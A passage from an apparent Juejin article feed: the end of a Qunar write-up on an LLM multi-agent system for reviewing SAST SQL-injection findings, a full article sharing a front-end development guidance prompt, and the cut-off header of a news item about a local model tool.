<pre><code class="hljs language-markdown" lang="markdown">二、审核分析流程（必须逐步执行）

<span class="hljs-bullet">1.</span> 获取漏洞详情：

<span class="hljs-bullet">*</span> 使用 SAST 工具获取漏洞的基本信息，包含：
<span class="hljs-bullet">  *</span> SARIF 格式内容；
<span class="hljs-bullet">  *</span> source<span class="hljs-emphasis">_json（污点源参数）；
  * path_</span>json（污点传播路径）；
<span class="hljs-bullet">  *</span> sink<span class="hljs-emphasis">_json（污点执行路径）。

2. 获取污点参数字段类型：

* 从 source_</span>json 中提取污点参数，例如 searchBox.period；

<span class="hljs-bullet">3.</span> 获取 MyBatis XML 中的 SQL 内容并判断拼接方式：

<span class="hljs-bullet">*</span> 使用 SAST 工具获取 SARIF 中记录的 XML 文件路径；
<span class="hljs-bullet">*</span> 提取完整的 SQL 定义（即 <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span></span> / <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">insert</span>&gt;</span></span> 等标签块）；
<span class="hljs-bullet">*</span> 必须展示实际 SQL 内容并标注是否使用 <span class="hljs-code">`${}`</span> 拼接或 <span class="hljs-code">`#{}`</span> 预编译；

<span class="hljs-bullet">4.</span> 判断是否存在白名单或过滤控制逻辑：

<span class="hljs-bullet">*</span> 仅当 SQL 使用 <span class="hljs-code">`${}`</span> 拼接，才需查找白名单校验代码；
<span class="hljs-bullet">*</span> 使用 GitLab 工具逐层回溯调用链中的 Java 类；
<span class="hljs-bullet">*</span> 必须明确展示类似的白名单逻辑代码，才视为存在有效防护：
<span class="hljs-bullet">*</span> 若未找到明确的白名单或值限制代码，则视为无防护。
</code></pre>
<h5 data-id="heading-14">4.质量控制</h5>
<p>这一步主要是告诉大模型，到底什么样的条件下存在安全漏洞，例如：</p>
<pre><code class="hljs language-markdown" lang="markdown">漏洞成立条件（必须同时满足）：

<span class="hljs-bullet">*</span> 污点参数来自用户输入；
<span class="hljs-bullet">*</span> 参数类型为字符串；
<span class="hljs-bullet">*</span> 参数用于 SQL 中 <span class="hljs-code">`${}`</span> 拼接；
<span class="hljs-bullet">*</span> 未经过白名单或强校验过滤；
</code></pre>
<p>在实际使用测试中，我们发现如下问题：</p>
<ul>
<li>
<p>当污点参数为自定义对象属性时，大模型不会去关注污点参数是该对象的哪个属性，导致误判污点参数。</p>
</li>
<li>
<p>当污点参数为自定义对象属性时，SARIF 调用链中没有对应的<code>dto</code>声明文件，导致大模型误判污点参数类型。</p>
</li>
</ul>
<p>所以我们要添加一些限定的规范在部分步骤中，例如：</p>
<pre><code class="hljs language-arduino" lang="arduino">获取污点参数字段类型：

* 从 source_json 中提取污点参数，例如 searchBox.period；
* 若为对象属性，获取其类定义源码文件；
* 获取路径策略如下：
  * 优先尝试 SARIF 中路径；
  * 若无，使用 GitLab 工具根据包路径和以下顺序尝试：

  dto → model → entity → po → vo → request → query

    * 若路径不确定，则根据 <span class="hljs-keyword">import</span> 或 package 名计算合理路径；
* 若多次尝试仍未获取到 Java 文件内容，必须终止审核并返回简洁错误说明：

未成功获取污点参数对应的源码文件，无法确认字段类型，审核失败。

* ⚠️ 一旦字段类型通过 GitLab 工具确认为 <span class="hljs-type">String</span>，后续分析中不得声称其为“整数”、“整型”或“数值类型”，否则中止审核并返回：

审核流程错误：污点参数类型前后判断矛盾，请重新确认类型并重新审核。
</code></pre>
<h5 data-id="heading-15">5.输出规范</h5>
<p>这里主要是让大模型按照我们想要的格式输出内容，多 Agent 的情况下我们要让他更加详尽的输出漏洞详情，在实际使用中要注意判断大模型是否有自己“生成”代码去分析，而不是根据实际代码分析，若有“生成”代码的情况，则需要调整对应的 prompt。</p>
<pre><code class="hljs language-markdown" lang="markdown">四、返回内容格式要求

请你输出详细且条理清晰的漏洞分析报告，内容须包含：

<span class="hljs-bullet">*</span> 漏洞基本信息和上下文描述；
<span class="hljs-bullet">*</span> 污点参数名称及类型说明；
<span class="hljs-bullet">*</span> SQL 拼接方式及对应 SQL 原文展示；
<span class="hljs-bullet">*</span> 白名单或过滤逻辑的存在与示例代码；
<span class="hljs-bullet">*</span> 对漏洞存在与否的专业分析理由；
<span class="hljs-bullet">*</span> 漏洞原理及危害说明（如存在）；
<span class="hljs-bullet">*</span> 修复建议（如存在）。

请以中文 Markdown 格式详细书写分析报告，避免 JSON、YAML 或其他结构化格式。  
如果流程遇到错误，请直接给出简洁错误说明即可。  
报告应严谨专业，方便后续人工或自动化处理。
</code></pre>
<h3 data-id="heading-16">4、汇总分析终审 Agent</h3>
<ul>
<li>
<p>提炼 Markdown 审核报告为标准结构化 JSON；</p>
</li>
<li>
<p>判断是否存在漏洞（has_vul）、生成审核备注（remark）、漏洞描述（description）、修复建议（repair_suggestion）字段；</p>
</li>
<li>
<p>结果将被用于工单系统自动创建。</p>
</li>
</ul>
<h2 data-id="heading-17">四、关键工具与技术实现</h2>
<h3 data-id="heading-18">1、数据标准化</h3>
<ul>
<li>将 SAST 工具输出的漏洞结果统一转换为国际通用标准：静态分析结果交换格式（SARIF）。这确保了漏洞数据的可读性、可交换性，并为后续的 Agent 分析提供了统一的数据源。</li>
</ul>
<h3 data-id="heading-19">2、LLM 能力</h3>
<ul>
<li>
<p>DeepSeek-V3 作为核心推理引擎，支持漏洞理解、上下文分析与报告生成；</p>
</li>
<li>
<p>通过 Prompt Engineering 精准限定 Agent 行为。</p>
</li>
</ul>
<h3 data-id="heading-20">3、Agent 工具化</h3>
<ul>
<li>
<p>提供 SAST MCP，查询 SARIF 数据与调用链；</p>
</li>
<li>
<p>提供 GitLab MCP，用于字段类型与校验逻辑确认。</p>
</li>
</ul>
<h3 data-id="heading-21">4、Prompt Engineering</h3>
<ul>
<li>
<p>每个 Agent 拥有独立 System Prompt；</p>
</li>
<li>
<p>明确分析步骤、判断逻辑与输出格式要求，提升审核一致性与准确性。</p>
</li>
</ul>
<h3 data-id="heading-22">5、工作流编排</h3>
<ul>
<li>使用 n8n 管理 Agent 调用、信息路由与数据解析；</li>
</ul>
<h2 data-id="heading-23">五、成效与落地成果</h2>
<p>该系统建成以后，我们使用 AI 对 Qunar 历史存量的白盒漏洞进行了自动化审核，与人工审核结果的一致率达到 97.36%</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c9bef6579f641a2babd36314acbb305~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708425&amp;x-signature=gXGiqoH4mvM8H0DUjFfG%2BhK1DAo%3D" alt="" loading="lazy"/></p>
<p>经过 6 个多月的部署与验证，Multi-Agent 白盒漏洞审核系统已在去哪儿网正式上线运营并取得显著成果：</p>
<ul>
<li>
<p>漏洞审核效率提升：单个漏洞审核缩短至 1-2 分钟内</p>
</li>
<li>
<p>白盒漏洞运营全面 AI 化：人工仅需花费少量时间确认 AI 审核忽略的漏洞，防止漏报</p>
</li>
<li>
<p>AI 自动生成漏洞描述和修复建议，自动创建工单，实现真正意义上的白盒漏洞审核闭环。</p>
</li>
</ul>
<h2 data-id="heading-24">六、AI 驱动的 SDLC 白盒漏洞管理实践</h2>
<p>基于前述 Multi-Agent 白盒漏洞审核系统 97.36%的高准确率表现，我们建立了一套基于 AI 判断结果的差异化处理策略：<strong>AI 判断为漏洞的直接自动推送工单，AI 判断为非漏洞的由人工进行二次确认</strong>。该策略既能快速响应真实漏洞，又通过人工复核降低漏报风险。</p>
<p>在此基础上，我们进一步构建了从开发到上线的全流程 AI 漏洞管理闭环，形成了如下的白盒漏洞处理流程：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8a8210f6d414a4f938c35ecbe7886a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708425&amp;x-signature=%2BblwizuCKKV%2FJP1TcDu5ITFrEz0%3D" alt="" loading="lazy"/></p>
<p>AI 的加入给我们的 SDLC 白盒运营工作带来了如下变化：</p>
<h3 data-id="heading-25">1、人工审核为主 → AI 主审 + 人工兜底，审核能力智能化升级</h3>
<p>白盒审核作为 SAST 流程中最“吃人工”的环节，一直以来严重依赖安全工程师逐条分析漏洞，工作重复且效率瓶颈明显。随着我们引入基于 Prompt 驱动的多智能体架构，AI 逐步承担起审核主体职责，并实现了准确率与可解释性的双重突破。</p>
<ul>
<li>
<p><strong>审核能力转变</strong>： 通过将漏洞审核流程标准化建模为“任务调度 → 漏洞解析 → 报告输出 → 汇总判断”，AI 智能体得以像一位资深安全工程师一样，自动提取调用链、识别污点参数、判断白名单逻辑并输出结构化结论。</p>
</li>
<li>
<p><strong>流程机制优化</strong>： 我们设计了“AI 审核为主 + 人工审核为辅”的差异化流转策略：</p>
</li>
<li>
<p>AI 判断漏洞真实存在的，直接自动生成工单推动修复；</p>
</li>
<li>
<p>AI 判断为非漏洞的，再进入人工二次确认流程，确保漏报风险最小化。</p>
</li>
<li>
<p><strong>带来的变化</strong>： 这一策略显著降低了人工审核负载，使得安全团队的角色从“执行者”转变为“复核者”和“策略制定者”，实现了漏洞审核工作的智能升级。</p>
</li>
</ul>
<h3 data-id="heading-26">2、上线前安全卡点 → Beta 阶段前移拦截，推动安全左移落地</h3>
<p>在传统流程中，由于审核人力紧张，SAST 常常被迫安排在上线前统一执行。这种“卡点式检测”模式容易造成修复时间紧张，甚至出现“已知带病上线”的风险。而 AI 审核效率的提升为我们实现漏洞检测左移创造了技术前提。</p>
<ul>
<li>
<p><strong>流程触发前移</strong>： 我们将 SAST 的触发时机由“上线打包前”前置到“Beta 发布阶段”，即每次 Beta 部署后系统即自动扫描代码、完成 AI 审核并生成结构化结果。研发团队在开发流程中就能第一时间收到可操作的漏洞修复建议。</p>
</li>
<li>
<p><strong>研发协同增强</strong>： 相比于以往“安全滞后通知”，如今的 AI 审核结果在 Beta 当天便以工单形式触达开发，极大缩短了响应周期，也提升了安全在研发视角中的“原生集成感”。</p>
</li>
<li>
<p><strong>带来的变化</strong>： 我们不再是“上线前修补”，而是真正做到“上线前消灭”问题。这一改变让安全左移不再是一句口号，而成为可以落地、持续执行的闭环机制。</p>
</li>
</ul>
<h3 data-id="heading-27">3、白盒试点成功 → 智能体能力横向复用，拓展安全自动化边界</h3>
<p>白盒漏洞审核是智能体体系最早落地的场景，也是我们验证“AI 能否完成专业安全判断”的关键试点。随着系统在该场景中稳定运行，我们开始探索其能力在更广泛安全任务中的复制与复用。</p>
<ul>
<li>智能体逻辑迁移：</li>
</ul>
<p>我们将“结构化输入 → 多轮分析 → 判断决策 → 标准化输出”的智能体架构，迁移到了告警运营与安全响应等场景。AI 可以自动分析原始告警上下文、合并重复信息、评估可信度，也可以在应急场景中提取日志中的 IOC、判断风险资产并自动触发处置流程。</p>
<ul>
<li>Prompt 体系复用：</li>
</ul>
<p>之所以能快速迁移，是因为我们从白盒审核中沉淀了一套完整的 Prompt 工程体系。每个 Agent 的角色定位、执行步骤、工具约束和输出格式都是标准化的，仅需调整上下文和调用接口，就能适配新的安全任务。</p>
<ul>
<li>带来的变化：</li>
</ul>
<p>AI 不再只是“审核专家”，而逐步演变为“通用安全助手”。我们正从“一个场景跑通”迈向“多场景联动、统一架构”的 AI Native 安全运营体系。</p>
<h2 data-id="heading-28">总结</h2>
<p>去哪儿网构建的 Multi-Agent 白盒漏洞智能审核系统，是应对 SDLC 中 SAST 漏洞运营挑战的一次创新性尝试。通过将 AI 智能体技术深度融入安全审核流程，我们实现了从人工密集型向智能驱动型的转变，有效解决了传统 SAST 工具误报率高、审核效率低、难以规模化等痛点。</p>
<p>更重要的是，我们构建了从漏洞发现、审核、修复到复测的完整 AI 驱动闭环，实现了真正意义上的无人值守安全运营。这不仅大幅降低了运营成本，也为企业的敏捷开发与快速迭代提供了更加可靠的安全保障。</p>
<p>未来，我们将持续优化 Agent 的智能体能力，扩展漏洞覆盖类型，并探索更深度的与 DevOps 流程集成，进一步提升软件开发的安全防护能力，推动安全运营向更加智能化、自动化的方向发展。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Prompt_前端开发指导提示词]]></title>    <link>https://juejin.cn/post/7602447286606299145</link>    <guid>https://juejin.cn/post/7602447286606299145</guid>    <pubDate>2026-02-03T06:51:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602447286606299145" data-draft-id="7602259669731180571" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Prompt_前端开发指导提示词"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-03T06:51:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="暖阳_"/> <meta itemprop="url" content="https://juejin.cn/user/1662117312465406"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Prompt_前端开发指导提示词
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1662117312465406/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    暖阳_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:51:59.000Z" title="Tue Feb 03 2026 06:51:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前端开发指导提示词</h2>
<p>覆盖需求与原型、交互细节、接口理解与联调、查询/翻页/保存后跳转等实现要点及代码审查。使用时复制「完整提示词」到对话中，再说明当前阶段或具体问题即可。</p>
<hr/>
<h3 data-id="heading-1">1. 如何使用本提示词</h3>
<ol>
<li><strong>选场景</strong>：根据你当前在做的事，从下面推荐场景中选一种开口。</li>
<li><strong>贴提示词</strong>：在对话开头或第一条消息中粘贴下文的「完整提示词」代码块整段（可放在系统角色或首条用户消息）。</li>
<li><strong>说需求</strong>：紧接着用一句话说明阶段或问题，例如：
<ul>
<li>「我在做 XX 页面的联调，帮我看下还缺什么」</li>
<li>「我要做查询、翻页、保存后回列表，列一下实现要点和检查项」</li>
</ul>
</li>
<li><strong>按输出行动</strong>：模型会按你选的场景给出该阶段的要点、检查项或审查意见；你按清单逐项落实或补充，有疑问再追问。</li>
</ol>
<p>若未说明阶段，模型会先问「当前在做哪一块」或给出各阶段简要清单供你选，再针对该阶段输出。</p>
<hr/>
<h3 data-id="heading-2">2. 推荐使用场景（按阶段）</h3>



































<table><thead><tr><th>阶段</th><th>你怎么说</th><th>提示词用到的部分</th></tr></thead><tbody><tr><td>需求/原型</td><td>「帮我过一遍前端要落实的点和待确认项」</td><td>需求与原型、交互细节</td></tr><tr><td>看接口文档</td><td>「帮我提炼请求响应和联调要点」</td><td>接口与契约、联调与实现</td></tr><tr><td>做查询/翻页/保存跳转</td><td>「我要做查询、翻页、保存后回列表，帮我列实现要点和检查项」</td><td>联调与实现、交互细节补充</td></tr><tr><td>联调/自测</td><td>「我在联调 XX 页面，帮我看下还缺什么」</td><td>联调与实现、交互细节补充</td></tr><tr><td>提交前</td><td>「帮我做一次前端代码审查」</td><td>代码审查</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-3">3. 前端开发环节（提示词覆盖范围）</h3>
<ul>
<li><strong>需求与原型</strong>：需求理解、原型阅读、信息架构与页面层级。</li>
<li><strong>交互与设计</strong>：加载/空/错状态、操作反馈、防重复提交、表单校验与提示。</li>
<li><strong>接口与契约</strong>：API 文档理解、请求/响应结构、错误码、鉴权、分页与排序约定。</li>
<li><strong>开发与联调</strong>：接口与页面联调、错误与边界处理、分页参数与列表刷新。</li>
<li><strong>交互细节补充</strong>：查询/筛选/重置、分页或加载更多、保存后跳转回列表、列表刷新、可访问性等。</li>
<li><strong>自测与验收</strong>：关键路径自测、兼容与基础性能。</li>
<li><strong>代码审查</strong>：结构/命名、接口与数据、交互与边界、安全与可维护性。</li>
</ul>
<hr/>
<h3 data-id="heading-4">4. 完整提示词（复制用）</h3>
<p>复制下面代码块中的全部内容到对话中使用即可。</p>
<pre><code class="hljs language-text" lang="text">&lt;System&gt;
你是前端开发指导助手，负责在需求理解、原型与交互、接口理解与联调、交互细节实现、以及代码审查等环节给出结构化指引和检查要点。不代替用户写全部代码，而是以「环节 + 要点 + 检查项」的方式引导用户查漏补缺；涉及接口或业务逻辑不确定时，要求标注「待与后端/产品确认」或「待补充」，不猜测接口契约或业务规则。

&lt;Context&gt;
用户在进行前端开发，可能处于不同阶段：页面原型绘制与理解、交互细节设计、接口 API 文档理解、接口与页面联调、查询/翻页/保存后跳转等交互细节实现、或代码完成后的审查。需要你按当前阶段给出该阶段的要点、常见坑和检查清单，并在需要时指出与上下游（产品、设计、后端）的对接点。

&lt;Instructions&gt;
1.[需求与原型]: 若用户提供原型或需求描述，先帮助厘清：页面层级与路由、主要用户操作路径、关键状态（加载/空/错误/成功）。指出原型中不明确处（如缺状态、缺异常流），并建议标注「待产品/设计确认」。
2.[交互细节]: 针对当前页面或功能，列出应落实的交互要点：加载态与骨架屏、空数据与错误态展示、操作反馈（Toast/Modal/Inline）、防重复提交、表单校验时机与提示方式。若涉及列表，单独列出：查询/筛选/重置、分页或加载更多、排序、列表项操作后是否刷新、保存/提交成功后是否跳转（如回列表）及是否带查询条件保持。
3.[接口与契约]: 根据用户提供的 API 文档或接口描述，帮助提炼：请求方法、路径、入参（必填/可选、类型、校验）、响应结构（数据与分页格式）、错误码与错误信息展示策略、鉴权方式（Header/Token）。不确定的字段或业务含义标注「待与后端确认」。
4.[联调与实现]: 联调阶段提醒：环境与 baseURL、错误与超时处理、分页参数与后端约定一致（pageNum/pageSize 等）、列表与表单数据绑定、保存成功后跳转路径与参数（如 list?keyword=xxx）。对「查询、翻页、保存后回列表」等常见场景，给出实现要点（如路由参数保留、列表重新请求时机）。
5.[交互细节补充]: 针对用户提到的具体交互（如查询、翻页、保存后回列表），逐项给出检查项：是否保留查询条件、是否重置到第一页、是否带成功提示、回列表时是否恢复筛选/分页状态、是否有 loading 与防重复点击。
6.[代码审查]: 对用户提供的代码或片段，从以下维度给出简短审查意见：目录与组件划分是否清晰、命名是否语义化、是否重复造轮子（可复用组件/工具）、接口调用是否集中管理、错误与边界是否处理、敏感信息是否暴露、关键交互（如翻页、跳转）是否与需求一致。不要求逐行审，只抓易错点和改进点。
7.[不确定时]: 对接口契约、业务规则、交互细节拿不准的，在对应位置注明「待与后端/产品/设计确认」，不编造字段或交互逻辑。

&lt;Constraints&gt;
- 按用户当前阶段输出，不一次性堆砌所有环节；若用户未说明阶段，先问「当前在做哪一块」或给出各阶段简要清单供选择。
- 涉及接口与业务时以「文档/约定为准」，未写明的标注待确认，不猜测。
- 代码审查以要点和风险为主，控制篇幅，便于快速对照。

&lt;Output Format&gt;
- 若为「阶段指导」：先写【当前阶段】与【本阶段目标】，再列 1～6 的要点与检查项（可用简短列表），最后如有需要列「待确认」项。
- 若为「交互细节补充」：按功能点（如查询、翻页、保存后跳转）逐条列出「实现要点」与「检查项」。
- 若为「代码审查」：先写【审查范围】，再按「结构/命名、接口与数据、交互与边界、安全与可维护」等维度给出 3～8 条结论，每条一句话 + 可选修改建议；最后可附「待确认」项。
- 所有输出保持清单化、可执行，便于用户逐项核对。

&lt;Reasoning&gt;（可选）
仅当用户明确要求「说明为什么这样设计」或「有哪些替代方案」时，在对应环节后附简短理由；否则不输出推理过程，保持指引简洁。
</code></pre>
<hr/>
<h3 data-id="heading-5">Changelog</h3>
<h4 data-id="heading-6">V1.0 (2025-02-03)</h4>
<ul>
<li>初版：前端开发指导提示词及使用介绍（使用方式、推荐场景、环节说明、完整提示词）</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[国产版Ollama来了，Clawdbot终于不只属于Mac和英伟达]]></title>    <link>https://juejin.cn/post/7602158221852459023</link>    <guid>https://juejin.cn/post/7602158221852459023</guid>    <pubDate>2026-02-03T07:17:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602158221852459023" data-draft-id="7602205524717830178" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="国产版Ollama来了，Clawdbot终于不只属于Mac和英伟达"/> <meta itemprop="keywords" content="人工智能,OpenAI"/> <meta itemprop="datePublished" content="2026-02-03T07:17:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="机器之心"/> <meta itemprop="url" content="https://juejin.cn/user/1873223543167902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            国产版Ollama来了，Clawdbot终于不只属于Mac和英伟达
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223543167902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    机器之心
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T07:17:01.000Z" title="Tue Feb 03 2026 07:17:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
